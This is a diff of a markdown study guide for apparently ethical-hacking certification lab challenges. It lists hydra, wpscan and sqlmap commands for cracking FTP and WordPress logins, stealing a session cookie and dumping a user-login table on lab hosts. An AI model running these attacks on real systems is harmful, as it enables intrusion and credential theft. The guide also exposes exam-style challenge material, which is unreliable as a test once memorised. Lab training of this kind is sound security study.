@@ -8,14 +8,14 @@ Flags
 
 CEHORG suspects of a possible session hijacking attack on a machine in its network. The organisation has retained the network traffic data for the session at C:\Users\Admin\Documents in the EH Workstation – 2 as sniffsession.pcap. You have been assigned a task to perform an analysis and find out the protocol that has been used for sniffing on its network. (Format: AAA)
 
-#Module 11 Session Hijacking - Lab 2 - Wireshark#
+#Module 11 Session Hijacking - Lab2 - Wireshark#
 ![Screenshot 2024-12-12 at 11 49 56 AM](https://github.com/user-attachments/assets/d1210604-f1dc-4e0d-b089-729266bfc0a6)
 
 **Challenge 2:**
 
 Perform an HTTP-recon on www.certifiedhacker.com and find out the version of Nginx used by the web server. (Format: N.NN.N)
 
-#Module 13 Hacking Web Servers - Lab 1 - httprecon#
+#Module 13 Hacking Web Servers - Lab1 - httprecon#
 ![Screenshot 2024-12-12 at 11 53 33 AM](https://github.com/user-attachments/assets/91dc1966-6db4-4f68-a38b-b722a7b749c8)
 
 
@@ -23,7 +23,7 @@ Perform an HTTP-recon on www.certifiedhacker.com and find out the version of Ngi
 
 An FTP site is hosted on a machine in the CEHORG network. Crack the FTP credentials, obtain the “flag.txt” file and determine the content in the file. (Format: Aaaaaaa*AAA)
 
-#Module 13 Hacking Web Servers - Lab 2 - Hydra#
+#Module 13 Hacking Web Servers - Lab2 - Hydra#
 
 ```
 nmap -p 21 172.16.0.0/24
@@ -44,7 +44,7 @@ hydra -L <username.txt> -P <password.txt> ftp://172.16.0.12
 
 Perform Banner grabbing on the web application movies.cehorg.com and find out the ETag of the respective target machine. (Format: "NaNNNNNaaaNaaNN*N")
 
-#Module 14 Hacking Web Applications - Lab 1 - telnet#
+#Module 14 Hacking Web Applications - Lab1 - telnet#
 
 ```
 telnet movies.cehorg.com 80
@@ -78,21 +78,63 @@ whatweb movies.cehorg.com -v
 
 Perform Web Crawling on the web application movies.cehorg.com and identify the number of live png files in images folder. (Format: N)
 
+#Module 14 Hacking Web Applications - Lab1 - OWASP ZAP#
+
+![Screenshot 2024-12-12 at 2 59 23 PM](https://github.com/user-attachments/assets/2c3a4375-fa10-4a52-8673-082863b51583)
+
 **Challenge 8:**
 
 Identify the load balancing service used by eccouncil.org. (Format: aaaaaaaaaa)
+
+#Module 14 Hacking Web Applications - Lab1 - lbd command#
+![Screenshot 2024-12-12 at 3 04 58 PM](https://github.com/user-attachments/assets/eb0e3f9d-4858-4e17-9eb0-03e0914d6445)
+
 
 **Challenge 9:**
 
 Perform a bruteforce attack on www.cehorg.com and find the password of user adam. (Format: aaaaaaNNNN)
 
+#Module 14 Hacking Web Applications - Lab2 - wpscan#
+```
+wpscan --url http://cehorg.com/wp-login.php -U ./Usernames.txt -P ./Passwords.txt
+```
+
+
 **Challenge 10:**
 
 Perform parameter tampering on movies.cehorg.com and find out the user for id 1003. (Format: Aaaaa)
 
+#Module 14 Hacking Web Applications - Lab2 - XSS Vuberability#
+![Screenshot 2024-12-12 at 3 19 27 PM](https://github.com/user-attachments/assets/37b7e592-3b46-40b6-910b-04c23303e353)
+
+
 **Challenge 11:**
 
 Perform a SQL Injection attack on movies.cehorg.com and find out the number of users available in the database. Use Jason/welcome as login credentials. (Format: N)
+
+#Module 15 SQL Injection - Lab1 -sqlmap#
+
+```
+document.cookie
+```
+![Screenshot 2024-12-12 at 3 31 53 PM](https://github.com/user-attachments/assets/84fb2749-dbd7-4c51-8329-e30a63b8a00b)
+
+```
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value that you copied in Step 8]" --dbs
+
+```
+![Screenshot 2024-12-12 at 3 42 09 PM](https://github.com/user-attachments/assets/88d0eba5-9d66-4657-9991-87a8e06dd2aa)
+
+```
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 8]" -D moviescope --tables
+```
+![Screenshot 2024-12-12 at 3 42 45 PM](https://github.com/user-attachments/assets/16e09ee5-282b-4d60-bb93-a17e1919943b)
+
+```
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 8]" -D moviescope -T User_Login --dump
+
+```
+![Screenshot 2024-12-12 at 3 43 38 PM](https://github.com/user-attachments/assets/084f945a-f7ce-480c-8f49-8a5f986ff0e6)
 
 **Challenge 12:**
 
